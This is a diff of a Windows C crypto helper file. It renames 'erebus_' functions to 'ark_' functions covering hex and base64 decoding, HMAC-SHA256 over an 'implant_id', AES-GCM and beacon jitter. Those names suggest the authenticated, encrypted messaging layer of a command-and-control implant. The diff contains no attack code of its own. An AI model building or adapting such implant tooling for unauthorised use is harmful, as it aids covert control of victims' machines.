@@ -6,11 +6,11 @@
 #include <string.h>
 #include <time.h>
 
-#include "erebus/crypto.h"
+#include "ark/crypto.h"
 
 #pragma comment(lib, "bcrypt.lib")
 
-int erebus_hex_decode(const char *hex, uint8_t *out, size_t out_cap, size_t *out_len) {
+int ark_hex_decode(const char *hex, uint8_t *out, size_t out_cap, size_t *out_len) {
     size_t n = strlen(hex);
     if (n % 2 || n / 2 > out_cap) return 0;
     for (size_t i = 0; i < n; i += 2) {
@@ -25,7 +25,7 @@ int erebus_hex_decode(const char *hex, uint8_t *out, size_t out_cap, size_t *out
 
 static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-int erebus_b64_decode(const char *b64, uint8_t **out, size_t *out_len) {
+int ark_b64_decode(const char *b64, uint8_t **out, size_t *out_len) {
     size_t in_len = strlen(b64);
     size_t cap = in_len;
     uint8_t *buf = (uint8_t *)malloc(cap);
@@ -49,7 +49,7 @@ int erebus_b64_decode(const char *b64, uint8_t **out, size_t *out_len) {
     return 1;
 }
 
-int erebus_hmac_sha256(const uint8_t *key, size_t key_len,
+int ark_hmac_sha256(const uint8_t *key, size_t key_len,
     const uint8_t *implant_id, size_t id_len, int64_t timestamp,
     uint8_t out[32]) {
     BCRYPT_ALG_HANDLE alg = NULL;
@@ -85,7 +85,7 @@ fail:
     return 0;
 }
 
-int erebus_aes_gcm_encrypt(const uint8_t key[32], const uint8_t *pt, size_t pt_len, uint8_t **out, size_t *out_len) {
+int ark_aes_gcm_encrypt(const uint8_t key[32], const uint8_t *pt, size_t pt_len, uint8_t **out, size_t *out_len) {
     BCRYPT_ALG_HANDLE alg = NULL;
     BCRYPT_KEY_HANDLE hkey = NULL;
     NTSTATUS st;
@@ -134,7 +134,7 @@ fail:
     return 0;
 }
 
-int erebus_aes_gcm_decrypt(const uint8_t key[32], const uint8_t *ct, size_t ct_len, uint8_t **out, size_t *out_len) {
+int ark_aes_gcm_decrypt(const uint8_t key[32], const uint8_t *ct, size_t ct_len, uint8_t **out, size_t *out_len) {
     if (ct_len < 28) return 0;
     BCRYPT_ALG_HANDLE alg = NULL;
     BCRYPT_KEY_HANDLE hkey = NULL;
@@ -181,7 +181,7 @@ fail:
     return 0;
 }
 
-uint32_t erebus_jitter_ms(uint32_t base_ms, int jitter_pct) {
+uint32_t ark_jitter_ms(uint32_t base_ms, int jitter_pct) {
     if (jitter_pct <= 0) return base_ms;
     uint32_t r = 0;
     BCryptGenRandom(NULL, (PUCHAR)&r, sizeof(r), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
